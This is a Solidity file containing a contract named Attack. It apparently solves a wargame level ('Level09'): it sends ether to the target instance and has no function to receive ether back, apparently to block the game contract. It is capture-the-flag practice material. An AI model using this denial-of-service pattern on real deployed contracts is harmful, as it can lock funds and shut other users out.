// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Level09.sol";

contract Attack {
    function atatatak(
        address payable _instance
    ) public payable returns (bool success) {
        (success, ) = _instance.call{value: msg.value}("");
    }
}
